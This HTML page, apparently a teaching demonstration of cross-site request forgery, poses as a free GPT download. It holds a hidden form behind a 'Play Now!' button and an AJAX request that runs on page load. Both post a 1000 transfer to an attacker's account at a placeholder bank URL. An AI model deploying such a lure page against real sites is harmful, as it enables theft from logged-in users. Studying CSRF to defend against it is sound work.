<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GPT Free Download!</title>
</head>
    <body>

        <!-- Using a form -->

        <h1>Click here to Download GPT!</h1>
        <form action="https://mybank.com/transfer.php" method="POST" id="stealMoneyForm">
            <input type="hidden" name="toAccount" value="attacker's account number">
            <input type="hidden" name="amount" value="1000">
        </form>
        <button onclick="document.getElementById('stealMoneyForm').submit();">
            Play Now!
        </button>

        <!-- Using Ajax -->

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                $.ajax({
                    url: "https://mybank.com/transfer.php",
                    type: "POST",
                    data: {
                        toAccount: "attacker's account number",
                        amount: "1000"
                    },
                    success: function(response) {
                        console.log("Money transferred successfully!");
                    },
                    error: function(xhr, status, error) {
                        console.log("Error in transferring money!");
                    }
                });
            });
        </script>
        
    </body>
</html>

    